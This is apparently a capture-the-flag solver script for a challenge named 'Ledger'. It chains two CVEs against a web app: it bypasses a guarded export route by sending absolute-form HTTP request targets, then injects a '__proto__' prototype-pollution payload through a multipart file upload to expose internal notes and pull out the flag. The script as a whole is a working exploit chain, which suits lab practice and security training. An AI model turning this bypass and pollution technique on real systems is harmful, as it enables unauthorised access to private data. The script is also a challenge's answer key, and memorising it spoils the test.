#!/usr/bin/env python3
"""Solver for Ledger.

Chains CVE-2026-85184 and CVE-2026-33863 to read the internal notes.

    python solve.py http://localhost:3000

No dependencies. An absolute-form request target cannot be sent through requests
or curl's normal path handling, so this speaks HTTP directly.
"""

import argparse
import http.client
import json
import re
import sys
from urllib.parse import urlsplit

BOUNDARY = "----ledgersolver"
PAYLOAD = '{"__proto__":{"includeInternal":true}}'


def send(host, port, target, method="GET", headers=None, body=b""):
    connection = http.client.HTTPConnection(host, port, timeout=15)
    connection.putrequest(method, target, skip_host=True, skip_accept_encoding=True)
    connection.putheader("Host", host)

    for name, value in (headers or {}).items():
        connection.putheader(name, value)

    connection.putheader("Content-Length", str(len(body)))
    connection.endheaders()

    if body:
        connection.send(body)

    response = connection.getresponse()
    payload = response.read()
    connection.close()

    return response.status, payload


def multipart(payload):
    return (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="file"; filename="settings.json"\r\n'
        "Content-Type: application/json\r\n\r\n"
        f"{payload}\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()


def export(host, port):
    status, payload = send(host, port, "http://anything/ops/export")
    if status != 200:
        raise SystemExit(f"export returned {status}: {payload[:120].decode(errors='replace')}")
    return json.loads(payload)["invoices"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="base URL of the instance, e.g. http://localhost:3000")
    args = parser.parse_args()

    url = urlsplit(args.target)
    host, port = url.hostname, url.port or 80

    status, payload = send(host, port, "/ops/export")
    print(f"[1] guarded route          {status} {payload[:40].decode(errors='replace')}")

    rows = export(host, port)
    print(f"[2] absolute-form bypass   {len(rows)} rows, internal_note present: {'internal_note' in rows[0]}")

    status, _ = send(
        host, port, "http://anything/ops/settings/import",
        method="POST",
        headers={"Content-Type": "application/json"},
        body=PAYLOAD.encode(),
    )
    print(f"[3] pollution as JSON body {status}, rejected by the body parser")

    status, payload = send(
        host, port, "http://anything/ops/settings/import",
        method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
        body=multipart(PAYLOAD),
    )
    print(f"[4] pollution as a file    {status} {json.loads(payload).get('ok')}")

    for row in export(host, port):
        found = re.search(r"[A-Za-z0-9_]+\{[^}]*\}", row.get("internal_note") or "")
        if found:
            print(f"[5] flag                   {found.group(0)}")
            return

    raise SystemExit("no flag found in the internal notes")


if __name__ == "__main__":
    main()
